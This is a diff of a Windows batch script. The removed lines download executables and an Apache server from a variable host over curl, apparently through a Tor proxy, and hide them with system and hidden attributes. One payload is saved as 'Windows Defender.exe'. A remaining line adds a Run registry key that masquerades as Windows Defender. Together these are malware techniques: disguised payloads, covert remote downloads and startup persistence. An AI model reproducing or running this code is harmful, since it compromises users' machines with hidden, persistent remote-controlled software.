@@ -14,20 +14,6 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
   set "proxy=--tlsv1"
 )
 
-attrib -s -h -i "%environment%\expose.exe" 
-if exist "%environment%\expose.exe" (
-    attrib +s +h +i "%environment%\expose.exe"
-) else (
-    "%environment%\curl.exe" -k %proxy% %host%/Tools/expose.zip --output "%temp%\expose.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\expose.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\expose.exe" && del "%temp%\expose.zip"
-)
- 
-if exist "%environment%\apache2\bin\httpd.exe" (
-    echo.
-) else (
-    "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.zip --output "%temp%\apache2.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.zip" -o"C:\" -y && attrib +s +h +i "C:\apache2" && del "%temp%\apache2.zip"
-)
-
-attrib -s -h -i "%environment%\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe --output "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe"
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
 set "folder=%random%"
